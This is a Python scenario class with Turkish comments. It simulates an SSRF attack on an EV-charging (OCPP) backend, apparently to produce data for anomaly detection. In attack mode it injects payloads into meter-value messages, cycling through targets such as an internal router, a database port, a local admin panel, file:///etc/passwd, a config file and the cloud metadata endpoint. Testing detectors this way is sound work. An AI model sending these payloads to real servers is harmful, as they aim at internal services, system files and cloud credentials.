from dataclasses import dataclass
from core.scenario_base import BaseScenario, BaseScenarioConfig
import math, random, asyncio

# 1. Config Sınıfı: Senaryoya özel parametreler [cite: 10-14]
@dataclass
class SSRFScenarioConfig(BaseScenarioConfig):
    base_power_kw: float = 11.0
    # Saldırıda kullanılacak SSRF payload listesi (PDF'ten alınmıştır)
    # Bu adresler sunucuyu manipüle etmek için kullanılır.
    ssrf_payloads = [
        "http://192.168.1.1",                          # İç ağdaki router [cite: 69]
        "http://10.0.0.50:5432",                       # İç veritabanı portu [cite: 70]
        "http://localhost:8080/admin-panel",           # Sunucunun kendi yönetim paneli [cite: 70]
        "file:///etc/passwd",                          # Yerel kullanıcı dosyası okuma 
        "file:///opt/csms/config/db.ini",              # Config dosyası okuma 
        "http://169.254.169.254/latest/meta-data/"     # Bulut (AWS/GCP) kimlik bilgileri 
    ]

# 2. Senaryo Sınıfı: BaseScenario'dan türetildi [cite: 15-18]
class SSRFScenario(BaseScenario):
    config: SSRFScenarioConfig

    async def run(self, mode: str, duration: int, stations: int, output_path=None):
        """
        mode: 'normal' veya 'attack'. Attack modunda SSRF payloadları enjekte edilir.
        """
        
        # 1) Charge Point'leri hazırla [cite: 21-22]
        cps = await self._prepare_charge_points(stations)

        # 2) Temel OCPP Akışı: Boot -> Authorize -> StartTransaction [cite: 23-26]
        # Bu akış bozulmadan uygulanır.
        for cp in cps:
            await cp.send_boot_notification()
            await cp.send_authorize()
            await cp.send_start_transaction()

        # 3) Anomali / Normal Döngüsü [cite: 28-31]
        start_time = asyncio.get_event_loop().time()
        
        # Sayaç, her döngüde farklı bir payload denemek için
        payload_index = 0
        
        while (asyncio.get_event_loop().time() - start_time) < duration:
            
            for cp in cps:
                # Varsayılan değerler
                power_value = self.config.base_power_kw
                extra_data = {} # Payload'ı taşıyacak yapı

                if mode == "attack":
                    # Attack modunda: Listeden sıradaki zararlı URL'yi seç
                    # Bu kısım saldırganın input alanını manipüle etmesini simüle eder [cite: 59]
                    current_payload = self.config.ssrf_payloads[payload_index % len(self.config.ssrf_payloads)]
                    
                    # Simülasyon loglarına veya gönderilen veriye bu payload'ı ekliyoruz
                    # Normalde MeterValues float taşır, ancak bu bir saldırı simülasyonu olduğu için
                    # string payload'ı 'context' veya 'reading_context' gibi alanlara enjekte ediyoruz.
                    extra_data = {
                        "anomali_type": "SSRF",
                        "malicious_input": current_payload,
                        "target": "Internal Server / Cloud Metadata"
                    }
                    
                    # Sıradaki payload'a geç
                    payload_index += 1
                    
                    # Saldırı sırasında güç değerlerinde de hafif oynamalar yaparak
                    # sistemin dikkatini dağıtabiliriz (Opsiyonel)
                    power_value = power_value * random.uniform(0.9, 1.1)

                else:
                    # Normal mod: Standart, temiz veri akışı
                    power_value = self.config.base_power_kw + random.uniform(-0.1, 0.1)
                
                # Değerleri gönder (Attack modunda zararlı veri de gider)
                # cp.send_meter_values(...) çağrısı [cite: 31]
                # Not: Altyapınızın 'extra_data' veya benzeri parametreleri desteklediğini varsayıyoruz.
                # Desteklemiyorsa sadece loglanır.
                await cp.send_meter_values(value=power_value, extra_params=extra_data)
            
            # Örnekleme hızı
            await asyncio.sleep(2)

        # 4) İşlem Sonu: StopTransaction [cite: 32-34]
        for cp in cps:
            await cp.send_stop_transaction()